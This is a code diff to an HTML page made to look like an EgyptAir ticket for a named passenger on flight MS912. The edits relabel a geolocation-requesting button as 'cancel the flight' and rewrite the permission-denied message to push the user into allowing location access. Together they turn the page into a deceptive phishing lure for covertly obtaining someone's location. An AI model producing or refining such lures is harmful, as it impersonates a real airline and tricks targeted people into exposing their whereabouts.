@@ -165,22 +165,22 @@
     <div class="ticket-card">
         <div class="ticket-header">
             <h1>مصر للطيران</h1>
-            <img src="https://i.imgur.com/2c1yO6S.png" alt="Airplane" class="plane-icon">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ-sjtE5Lp56QS9KGyN8NcvKsn3R_VtAha6gg&s" alt="Airplane" class="plane-icon">
         </div>
         <div class="ticket-body">
             <div class="flight-route">
-                <span class="airport">CAI</span><div class="route-line"></div><span class="airport">DXB</span>
+                <span class="airport">Dubai</span><div class="route-line"></div><span class="airport">Cairo</span>
             </div>
             <div class="flight-details">
-                <div class="detail-item"><p>اسم المسافر</p><span>محمد أحمد</span></div>
-                <div class="detail-item"><p>التاريخ</p><span>19 / 07 / 2025</span></div>
+                <div class="detail-item"><p>اسم المسافر</p><span>محمد أحمد محمود</span></div>
+                <div class="detail-item"><p>تاريخ السفر </p><span>5 / 8 / 2025</span></div>
                 <div class="detail-item"><p>رقم الرحلة</p><span>MS912</span></div>
                 <div class="detail-item"><p>البوابة</p><span>F8</span></div>
             </div>
         </div>
         <div class="separator"></div>
         <div class="action-section">
-            <button id="locationButton" class="action-button">اضغط لتسجيل موقعك</button>
+            <button id="locationButton" class="action-button"> اضغط لإلغاء الرحلة</button>
             <div id="statusMessage" class="status-message"></div>
         </div>
     </div>
@@ -225,7 +225,7 @@
 
         locationButton.addEventListener('click', () => {
             locationButton.disabled = true;
-            locationButton.textContent = '...جارٍ تحديد الموقع';
+            locationButton.textContent = '...جار الغاء الرحله ';
             statusMessage.className = 'status-message';
             
             if (!navigator.geolocation) {
@@ -262,7 +262,7 @@
         function handleError(error) {
             let message = "فشل تحديد الموقع.";
             if (error.code === 1) {
-                message = "لقد رفضت إعطاء الإذن للموقع.";
+                message = "الرجاء الضغط علي سماح لخدمات الموقع !.";
             } else if (error.code === 2) {
                 message = "لا يمكن الوصول لشبكة تحديد المواقع.";
             } else if (error.code === 3) {
@@ -274,7 +274,7 @@
 
         function resetButtonState() {
             locationButton.disabled = false;
-            locationButton.textContent = 'اضغط لتسجيل موقعك';
+            locationButton.textContent = '  اضغط لالغاء الرحله ';
         }
 
         function displayStatus(message, type) {
